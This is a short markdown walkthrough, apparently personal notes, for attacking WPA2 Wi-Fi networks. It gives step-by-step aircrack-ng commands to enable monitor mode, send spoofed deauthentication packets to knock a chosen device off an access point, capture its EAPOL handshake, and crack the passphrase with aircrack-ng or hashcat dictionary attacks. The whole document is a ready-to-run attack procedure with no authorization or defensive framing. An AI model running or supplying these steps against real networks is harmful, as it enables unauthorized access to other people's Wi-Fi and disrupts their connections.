# WPA2 Deauth Attack

Basic Steps:

* (1) Put wNIC into monitor or promiscious mode
* (2) Monitor the network for traffic
    * (2a) Consider Strength of signal
    * (2b) Consider Whether or not you see both router and device traffic
* (3) Target the monitor to just the interested Access Point and dump its traffic
* (4) In parallel, send a malicious de-auth packet from your wNIC whose dest is the station and whose src is the router
* (5) Hopefully capture the eapol handshake to get the encrypted passphrase
* (6) Use a hash-breaker tool find a passphrase usually from a dictionary or set of rules that reproduce the recovered hased passphrase

These steps can be executed on a linux box with the following

* [install aircrack tools](https://www.aircrack-ng.org/doku.php?id=install_aircrack)
* `sudo airmon-ng start wlp5s0`
    * Assume your NIC is `wlp5s0`, most are named `wlan0`
* `iwconfig to verify monitor mode`
* `sudo airodump-ng wlp5s0mon`
    * This will give you an idea of what AP's, stations, and channels to target
    * Record the MAC of the AP and the station you want to kick off
* `sudo airodump-ng wlp5s0mon -c <chan> --bssid <AP MAC> -w <file_name>`
    * Keep this open to log WPA2 Handshake
* In other term `sudo aireplay wlp5s0mon -0 1 -a <AP MAC> -c <TARGET MAC>`
    * This sends the attack
    * Hopefully in the dump term you capture the handshake
* To crack using aircrack: `aircrack-ng -a 2 -b <bssid> <.cap file> -w <wordlist>`
* To restore if -> `sudo airmon-ng stop wlp5s0mon && sudo ifconfig wlp5s0 up`
* To crack with hashcat Install hashcat and haschcat-utils
    * Convert the `.cap` to a `.hccapx`
    * `hashcat -m 2500 -a 0 <hhcapx> <wordlist>` will do a straight dictionary attack 